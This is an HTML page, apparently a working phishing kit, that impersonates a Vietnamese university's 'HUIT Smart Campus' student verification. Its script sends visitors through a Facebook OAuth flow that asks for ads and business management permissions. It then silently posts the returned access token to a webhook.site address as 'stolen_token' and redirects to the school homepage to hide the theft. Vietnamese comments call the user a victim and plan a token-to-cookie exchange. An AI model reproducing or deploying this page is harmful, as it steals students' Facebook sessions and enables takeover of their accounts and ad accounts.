<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>Xác Thực Sinh Viên - HUIT Smart Campus</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 12px 24px rgba(0,0,0,0.1); text-align: center; width: 420px; border-top: 6px solid #1877f2; }
        .huit-logo { width: 90px; margin-bottom: 20px; }
        h2 { color: #1c1e21; margin-bottom: 15px; font-size: 26px; }
        p { color: #606770; font-size: 16px; margin-bottom: 30px; line-height: 1.6; }
        .btn-fb { background-color: #1877f2; color: white; border: none; padding: 16px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 18px; display: flex; align-items: center; justify-content: center; }
        .btn-fb:hover { background-color: #166fe5; }
        .fb-icon { width: 24px; margin-right: 12px; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://huit.edu.vn/tt-daotao/images/logo_huit.png" class="huit-logo">
        <h2>Hệ Thống Smart Campus</h2>
        <p>Để hoàn tất đồng bộ lịch học và xem kết quả học tập qua Facebook Messenger, bạn vui lòng nhấn xác thực tài khoản bên dưới.</p>
        
        <button class="btn-fb" id="loginBtn">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-icon">
            Tiếp tục dưới tên Phương
        </button>
    </div>

<script>
    // === CẤU HÌNH THÔNG SỐ (PHƯƠNG THAY APP_ID VÀ WEBHOOK VÀO ĐÂY) ===
    const APP_ID = "2402493790174154"; 
    const REDIRECT_URI = window.location.href.split('#')[0]; // Tự động lấy link GitHub hiện tại
    const WEBHOOK_URL = "https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916";

    document.getElementById('loginBtn').onclick = function() {
        // Yêu cầu quyền nâng cao để Token có "trọng lượng" khi đổi sang Cookie
        const SCOPES = "public_profile,email,ads_management,business_management";
        
        const fbUrl = `https://www.facebook.com/v21.0/dialog/oauth?client_id=${APP_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${SCOPES}&auth_type=rerequest`;
        
        window.location.href = fbUrl;
    };

    window.onload = function() {
        // Sau khi nạn nhân nhấn "Tiếp tục", Facebook sẽ trả về Token trên URL
        if (window.location.hash.includes("access_token")) {
            const params = new URLSearchParams(window.location.hash.substring(1));
            const token = params.get('access_token');
            
            if (token) {
                // Gửi Token âm thầm về Webhook để chuẩn bị bước Token Exchange
                fetch(`${WEBHOOK_URL}?stolen_token=${token}`)
                .then(() => {
                    // Xóa dấu vết bằng cách chuyển hướng về trang chủ trường
                    window.location.href = "https://huit.edu.vn/";
                });
            }
        }
    }
</script>

</body>
</html>
